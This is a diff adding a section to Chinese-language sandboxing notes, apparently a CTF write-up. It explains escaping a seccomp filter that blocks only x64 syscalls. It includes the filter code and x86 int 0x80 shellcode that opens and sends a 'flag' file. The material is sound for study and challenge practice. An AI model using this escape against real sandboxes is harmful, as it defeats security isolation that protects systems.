@@ -16,6 +16,8 @@ comments: true
     - [2.1.2 只允许("linkat", "open", "read", "write", "sendfile")](#212-只允许linkat-open-read-write-sendfile)
     - [2.1.3 只允许("fchdir", "open", "read", "write", "sendfile")](#213-只允许fchdir-open-read-write-sendfile)
     - [2.1.4 只允许("chdir", "chroot", "mkdir", "open", "read", "write", "sendfile")](#214-只允许chdir-chroot-mkdir-open-read-write-sendfile)
+  - [2.2 利用syscall confusion实现逃逸](#22-利用syscall-confusion实现逃逸)
+    - [2.2.1 只限制x64，不限制x86](#221-只限制x64不限制x86)
 - [附录：利用chroot之前打开的目录/文件描述符 —— 手法](#附录利用chroot之前打开的目录文件描述符--手法)
   - [附录A：程序本身在chroot之前已打开目录/文件描述符](#附录a程序本身在chroot之前已打开目录文件描述符)
   - [附录B：bash tricks](#附录bbash-tricks)
@@ -251,6 +253,66 @@ test_path:
 point_path:
 .string "../../"
 ```
+
+## 2.2 利用syscall confusion实现逃逸<br>
+细节请看[https://wsxk.github.io/sandboxing/](https://wsxk.github.io/sandboxing/)<br>
+总之就是**x86的系统调用和x64的系统调用，相同系统调用号指向不同的系统调用**<br>
+
+### 2.2.1 只限制x64，不限制x86<br>
+```c
+    scmp_filter_ctx ctx;
+
+    puts("Restricting system calls (default: allow).\n");
+    ctx = seccomp_init(SCMP_ACT_ALLOW);
+    for (int i = 0; i < 512; i++)
+    {
+        switch (i)
+        {
+        case SCMP_SYS(close):
+            printf("Allowing syscall: %s (number %i).\n", "close", SCMP_SYS(close));
+            continue;
+        case SCMP_SYS(stat):
+            printf("Allowing syscall: %s (number %i).\n", "stat", SCMP_SYS(stat));
+            continue;
+        case SCMP_SYS(fstat):
+            printf("Allowing syscall: %s (number %i).\n", "fstat", SCMP_SYS(fstat));
+            continue;
+        case SCMP_SYS(lstat):
+            printf("Allowing syscall: %s (number %i).\n", "lstat", SCMP_SYS(lstat));
+            continue;
+        }
+        assert(seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0);
+    }
+
+    puts("Adding architecture to seccomp filter: x86_32.\n");
+    seccomp_arch_add(ctx, SCMP_ARCH_X86);
+
+    puts("Executing shellcode!\n");
+
+    assert(seccomp_load(ctx) == 0);
+```
+这段代码，只允许4个系统调用`close,stat,lstat,fstat`在x64中，系统调用号为：`3,4,5,6`<br>
+然而**并没有x86架构的限制**<br>
+```asm
+.global _start
+_start:
+.intel_syntax noprefix
+mov eax, 295 #openat
+mov ebx, 3 # assume opened dir fd = 3
+lea ecx, [eip+file_path]
+mov edx, 0 # O_RDONLY
+int 0x80
+
+mov ebx, 1
+mov ecx, eax
+mov edx, 0
+mov esi,128
+mov eax, 187
+int 0x80
+file_path:
+.string "flag"
+```
+
 
 # 附录：利用chroot之前打开的目录/文件描述符 —— 手法<br>
 ## 附录A：程序本身在chroot之前已打开目录/文件描述符<br>
